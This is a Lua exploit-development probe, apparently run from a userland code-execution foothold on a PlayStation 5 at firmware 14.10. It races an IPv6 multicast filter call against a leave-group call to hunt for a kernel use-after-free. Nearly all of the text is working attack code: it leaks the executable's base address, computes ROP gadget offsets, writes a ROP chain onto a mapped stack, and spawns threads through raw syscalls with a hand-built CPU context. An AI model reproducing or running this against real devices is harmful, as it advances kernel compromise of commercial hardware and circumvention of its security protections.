-- CRASH_CLASS: HIGH
-- Bounded PS5 14.10 IPV6_MSFILTER / leave-group overlap test.
-- Each child performs one validated 128-source filter call, writes its result,
-- and exits. The parent attempts leave immediately after thr_create.
-- A return code alone does not establish a UAF. Stop on any missing child result.

print("=== PROBE 50i: MSFILTER / LEAVE OVERLAP ===")
local function num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(p, v) memory.write_dword(p, v) end
local function wq(p, v) memory.write_qword(p, v) end
local function z(p, n) for off = 0, n - 4, 4 do wd(p + off, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function fmt(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return tostring(v)
end
local function msleep(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    sc(240)(uint64(ts), uint64(0))
end

local info = memory.alloc(0x200)
z(info, 0x200); wd(info, 0x160)
local ir = sc(593)(uint64(0), uint64(info))
local lo = num(memory.read_dword(info + 0x108))
local hi = num(memory.read_dword(info + 0x10c))
if num(ir) ~= 0 or lo == 0 then print("ABORT no eboot"); return end
local base = uint64(string.format("0x%X%08X", hi, lo))
local RET = base + 0x42
local POP_RAX = base + 0x992
local POP_RDI = base + 0xC9DFE
local MOV_RDI_RAX = base + 0x92C67
local STUB = syscall.pipe.fn_addr

local fd = num(sc(97)(uint64(28), uint64(2), uint64(17)))
print("socket=" .. fd)
if fd < 0 or fd > 1024 then print("ABORT socket"); return end
local mreq = memory.alloc(32)
z(mreq, 32)
b(mreq, 0, 0xff); b(mreq, 1, 2); b(mreq, 15, 1)
wd(mreq + 16, 1)

local req = memory.alloc(160)
local sources = memory.alloc(128 * 128)
z(req, 160)
wd(req, 1); wd(req + 4, 1); wd(req + 8, 128)
b(req, 16, 28); b(req, 17, 28)
b(req, 24, 0xff); b(req, 25, 2); b(req, 39, 1)
wd(req + 40, 1)
wq(req + 144, sources)
for i = 1, 128 do
    local p = sources + (i - 1) * 128
    z(p, 128)
    b(p, 0, 28); b(p, 1, 28)
    b(p, 8, 0x20); b(p, 9, 1); b(p, 23, i)
end

local marker = memory.alloc(8)
local tidbuf = memory.alloc(8)
local ctx = memory.alloc(0x500)
local success, rejected, leave_failed = 0, 0, 0
local trials = 16
local safe_to_close = true
for trial = 1, trials do
    local jr = sc(105)(uint64(fd), uint64(41), uint64(12), uint64(mreq), uint64(20))
    if num(jr) ~= 0 then
        print("ABORT trial=" .. trial .. " join=" .. fmt(jr)); break
    end
    local stack = sc(477)(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xffffffff), uint64(0))
    if fmt(stack) == "0xFFFFFFFFFFFFFFFF" then
        print("ABORT trial=" .. trial .. " stack mmap failed"); break
    end
    local chain = stack + 0x10000 - 0x100
    z(chain, 0x100)
    local off = 0
    local function push(v) wq(chain + off, v); off = off + 8 end
    push(POP_RAX); push(uint64(105)); push(STUB)
    push(POP_RDI); push(marker); push(MOV_RDI_RAX)
    push(POP_RDI); push(uint64(0)); push(POP_RAX); push(uint64(431)); push(STUB)

    z(ctx, 0x500)
    wq(ctx + 0x108, uint64(0x480)); wq(ctx + 0x110, uint64(0x10000))
    wq(ctx + 0x0c0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3b))
    wq(ctx + 0x0f8, chain); wq(ctx + 0x0e0, RET)
    wq(ctx + 0x048, uint64(fd))
    wq(ctx + 0x050, uint64(41))
    wq(ctx + 0x058, uint64(74))
    wq(ctx + 0x060, req) -- wrapper ABI RCX
    wq(ctx + 0x098, req) -- raw syscall ABI R10
    wq(ctx + 0x068, uint64(152))
    wq(marker, uint64(0xDEADDEAD)); z(tidbuf, 8)
    local cr = sc(430)(uint64(ctx), uint64(tidbuf), uint64(0))
    if num(cr) ~= 0 then
        print("ABORT trial=" .. trial .. " thr_create=" .. fmt(cr))
        sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))
        break
    end
    local lr = sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))
    if num(lr) ~= 0 then leave_failed = leave_failed + 1 end
    local rv = memory.read_qword(marker)
    for _ = 1, 20 do
        if fmt(rv) ~= "0x00000000DEADDEAD" then break end
        msleep(1)
        rv = memory.read_qword(marker)
    end
    print("trial=" .. trial .. " child=" .. fmt(rv) .. " leave=" .. fmt(lr))
    if fmt(rv) == "0x00000000DEADDEAD" then
        print("ABORT child result missing; socket remains open")
        safe_to_close = false
        break
    end
    local tid = memory.read_qword(tidbuf)
    local sr = sc(433)(tid, uint64(0))
    for _ = 1, 20 do
        if num(sr) ~= 0 then break end
        msleep(1)
        sr = sc(433)(tid, uint64(0))
    end
    if num(sr) == 0 then
        print("ABORT child still alive; socket remains open")
        safe_to_close = false
        break
    end
    if fmt(rv) == "0x0000000000000000" then success = success + 1
    else rejected = rejected + 1 end
    if num(lr) ~= 0 then print("ABORT leave failed"); break end
    msleep(2)
end
if safe_to_close then sc(6)(uint64(fd)) end
print("summary child_success=" .. success .. " child_rejected=" .. rejected ..
    " leave_failed=" .. leave_failed)
print("canary pid=" .. tostring(sc(20)()))
print("=== PROBE 50i COMPLETE ===")
